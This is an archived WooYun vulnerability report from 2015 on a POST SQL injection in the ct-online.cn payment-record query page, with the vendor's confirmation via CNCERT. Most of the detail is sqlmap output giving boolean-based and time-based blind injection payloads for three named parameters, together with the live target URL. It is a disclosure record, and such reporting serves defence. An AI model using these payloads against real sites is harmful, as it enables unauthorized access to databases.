wybug_title: WEB注入安全之成铁在线某处POST注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-22：	细节已通知厂商并且等待厂商处理中									2015-07-26：	厂商已经确认，细节仅向厂商公开									2015-08-05：	细节向核心白帽子及相关领域专家公开									2015-08-15：	细节向普通白帽子公开									2015-08-25：	细节向实习白帽子公开									2015-09-09：	细节向公众公开  简要描述： WEB注入安全之成铁在线某处POST注入漏洞 详细说明：  
---Place: POSTParameter: lasttime    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: atype=&stp=0&firsttime=2013-09-01&lasttime=2013-09-10' AND 6059=6059 AND 'YHHp'='YHHp    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: atype=&stp=0&firsttime=2013-09-01&lasttime=2013-09-10' AND SLEEP(5) AND 'izSM'='izSMPlace: POSTParameter: atype    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: atype=%' AND 2482=2482 AND '%'='&stp=0&firsttime=2013-09-01&lasttime=2013-09-10    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: atype=%' AND SLEEP(5) AND '%'='&stp=0&firsttime=2013-09-01&lasttime=2013-09-10Place: POSTParameter: firsttime    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: atype=&stp=0&firsttime=2013-09-01' AND SLEEP(5) AND 'YnLg'='YnLg&lasttime=2013-09-10---there were multiple injection points, please select the one to use for following injections:[0] place: POST, parameter: atype, type: Single quoted string (default)[1] place: POST, parameter: firsttime, type: Single quoted string[2] place: POST, parameter: lasttime, type: Single quoted string[q] Quit> 2
   漏洞证明：  


http://www.ct-online.cn/query_payrecrod.action?atype=&stp=0&firsttime=2013-09-01&lasttime=2013-09-10
   修复方案：     版权声明：转载请注明来源 0x 80@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-26 22:03 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给四川分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
